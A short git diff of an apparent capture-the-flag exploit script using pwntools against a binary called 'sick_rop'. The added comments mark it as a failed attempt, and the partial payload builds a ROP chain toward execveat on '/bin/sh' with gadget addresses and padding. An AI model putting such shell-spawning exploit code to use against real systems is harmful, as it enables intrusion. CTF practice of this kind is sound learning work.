@@ -1,6 +1,8 @@
 from pwn import *
 import time
 
+# Failed attempt at solving challenge with ROP & execveat()
+
 # Load Environment
 context.terminal = ['tmux','splitw' ,'-h']
 elf = ELF("./sick_rop")
@@ -21,7 +23,8 @@ esi_rdx = 0x000000000040100b
 binsh = "\x2f\x2f\x62\x69\x6e\x2f\x73\x68"
 
 
-# Need r10 = 0x0 for flag.
+# execveat(1, '/bin/sh',0,0,0)
+# Need r10 = 0x0 for flag :(
 payload = ""
 payload += binsh                  # Writes to RSI
 payload += "\x00" * (40 - 8) 
